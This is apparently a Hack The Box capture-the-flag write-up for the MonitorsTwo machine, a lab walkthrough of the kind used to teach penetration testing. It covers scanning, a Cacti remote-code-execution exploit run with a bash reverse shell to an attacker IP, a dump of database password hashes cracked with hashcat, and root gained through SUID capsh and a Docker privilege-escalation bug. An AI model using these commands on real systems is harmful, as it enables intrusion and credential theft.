---
title: HTB | MonitorsTwo
date: 2023-07-9 14:00:00 -500
categories: [HTB, write-ups]
tags: [htb,red-team,ctf]
img_path: /assets/img/monitorstwo
---

## NMAP

`nmap -p- -sV -sC 10.10.11.211`

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-25 14:22 PDT
Nmap scan report for 10.10.11.211
Host is up (0.079s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.17 seconds
```

## Gobuster

```
gobuster dir --url http://10.10.11.211/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,xml 
```

![gobuster-resaults](Pasted image 20230625144349.png)

Nothing too interesting was found, so moving on to see if we can glean any information from cacti site itself.

## Cacti

![cacti](Pasted image 20230625142620.png)

Version of Cacti running is:  1.2.22 

According to the change log there is a CVE that was patched in version 2.2.3 
![change-log](Pasted image 20230625144433.png)

## RCE for Cacti
Write up on the Command execution found on google: [https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/)

CVE POC: [https://github.com/sAsPeCt488/CVE-2022-46169](https://github.com/sAsPeCt488/CVE-2022-46169)

I was able to download a copy of the payload from the github, and run it on my machine to get a shell open via a netcat reverse tunnel

![copying-over-payload](Pasted image 20230625152056.png)

The bit of the payload that creates the revshell
![](Pasted image 20230625152555.png)

```
python3 cacti_poc.py http://10.10.11.211/ -c "bash -c 'bash -i >& /dev/tcp/10.10.14.7/1337 0>&1'"
```

## Finding the Good stuff

![etc/password](Pasted image 20230625152954.png)

Interesting file in `/` called `entrypoint.sh`, chmod +x gives us a command that will connect to the mysql server

![entrypoint.sh](Pasted image 20230625155852.png)

After connecting to the database we are able to query to see what tables are there. Some of the more interesting ones are shown bellow.

![msql-query](Pasted image 20230625160618.png)

Using the following msql command we are able to dump all of the table contents from the user_auth table.
```
mysql --host=db --user=root --password=root -e "select * from user_auth" cacti
```

![mysql](Pasted image 20230625160456.png)

Here is the output for the for the SQL command:
```
< --password=root -e "select * from user_auth" cacti
id	username	password	realm	full_name	email_address	must_change_password	password_change	show_tree	show_list	show_preview	graph_settings	login_opts	policy_graphs	policy_trees	policy_hosts	policy_graph_templates	enabled	lastchange	lastlogin	password_history	locked	failed_attempts	lastfail	reset_perms

1	admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC	0	Jamie Thompson	admin@monitorstwo.htb		on	on	on	on	on	2	1	1	1	1	on	-1	-1	-1	00	663348655

3	guest	43e9a4ab75570f5b	0	Guest Account		on	on	on	on	on	3	1	1	1	1	1		-1	-1	-1		0	0	0

4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune	marcus@monitorstwo.htb			on	on	on	on	1	1	1	1	1	on	-1	-1		on	0	0	2135691668

```

The logins are emails which gives us the FQDN they are using: `monitorstwo.htb`

## Password Decryption 

admin	
`$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC`

marcus	
`$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C`

Hashes start with `$2y$`  which is Bcrypt (blowfish)

Running hashcat against the hashes in mode 3200 for Bcrypt:
```
hashcat -a 0 -m 3200 2mon-hash.txt /usr/share/wordlists/rockyou.txt 
```

One Hash has a hit:
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:
`funkymonkey`

## User Takeover
`ssh marcus@10.10.11.211`

Marcus ssh:

![you-got-mail](Pasted image 20230625164011.png)

Looks like Marcus has some system mail, wonder if there is anything in there?

![the-mail](Pasted image 20230625164443.png)

This is looking like the next area for attack: `CVE-2021-41091`

Checking the running process shows that Docker containers running int he moby namespace are present:
![](Pasted image 20230709154945.png)

There is an exploit for this [https://github.com/UncleJ4ck/CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091)

Secondary Artical:
[https://exploit-notes.hdks.org/exploit/container/docker/moby-docker-engine-privesc/](https://exploit-notes.hdks.org/exploit/container/docker/moby-docker-engine-privesc/)

I downloaded the POC from the GitHub repo and then copied over to the remote machine:

![phython-webserver](Pasted image 20230709160353.png)

![exploit-copied](Pasted image 20230709160420.png)

Running the script will work and it gives us a venerable path:
```
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
``````

![mobi-fail](Pasted image 20230709160533.png)

However, its not able to execute a shell, My guess is that we will need to go back to our remote shell on the Cacti instance and change some settings from there. Since the POC suggested that the /bin/bash of the container needs to have the setuid bit enabled

## Privilege Escalation
Getting back into the Cacti container I was able to download linpeas over to the /tmp directory and execute it

![http-request](Pasted image 20230709161446.png)

Found some interesting files particularly: /sbin/capsh
![linpeas](Pasted image 20230709165556.png)

Looks like we can run it and it has the SUID bit set:

![sbin/capsh](Pasted image 20230709165718.png)

![sbin/capsh-2](Pasted image 20230709165645.png)

We can give ourselves root by using: `/sbin/capsh --gid=0 --uid=0 --`
and then set the SUID bit on /bin/bash with `chmod u+s /bin/bash`

![rev-shel](Pasted image 20230709171813.png)

## We have Root!

Re-ran moby-exp.sh:
![moby](Pasted image 20230709171918.png)

Shell spawned, but exited time to re-connect

![root-1](Pasted image 20230709172038.png)

We have root! Now its time for the Flag!

![root-2](Pasted image 20230709172234.png)

![completed](Pasted image 20230709172323.png)
